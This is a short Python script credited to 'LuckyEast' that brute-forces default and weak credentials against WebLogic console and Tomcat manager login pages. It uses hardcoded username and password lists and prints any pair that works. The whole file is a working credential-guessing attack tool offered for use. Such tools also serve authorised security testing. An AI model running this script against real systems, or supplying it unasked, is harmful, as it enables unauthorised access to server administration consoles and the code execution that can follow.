import requests
import sys
import base64

def weblogic_login(url):
    url = url + '/console/j_security_check'
    flag = 0
    result = 'console"'
    user_list = ['weblogic', 'admin']
    pass_list = ['weblogic', 'Weblogic1', 'weblogic123', '123456', 'Oracle@123', 'admin']
    headers = {
        'Content-Type':'application/x-www-form-urlencoded'
    }

    for user in user_list:
        for password in pass_list:
            post_str = str("j_username=" + user + "&j_password=" + password + "&j_character_encoding=UTF-8")
            rsp = requests.post(url, data=post_str, timeout=3, verify=False, headers=headers)
            if result in rsp.text:
                print 'User: ' + user + ' Password: ' + password
                flag = 1
    if flag == 0:
        print 'Weblogic weakpass not exist!'

def tomcat_login(url):
    flag = 0
    url = url + '/manager/html'
    user_list = ['tomcat', 'admin', 'both', 'role1']
    pass_list = ['tomcat']
    for user in user_list:
        for passwd in pass_list:
            headers = {'Authorization': 'Basic %s==' % (base64.b64encode(user+':'+passwd))}
            rsp = requests.get(url,headers=headers,timeout=3)
            if rsp.status_code == 200:
                print 'User: ' + user + ' Password: ' + passwd
                flag = 1
    if flag == 0:
        print 'Tomcat weakpass not exist!'

if __name__ == "__main__":
    print '''
--------------------------------------------
Application Weakpass script by LuckyEast >_< 
--------------------------------------------
'''
    mode = sys.argv[1]
    url = sys.argv[2]
    if mode == 'weblogic':
        weblogic_login(url)
    if mode == 'tomcat':
        tomcat_login(url)
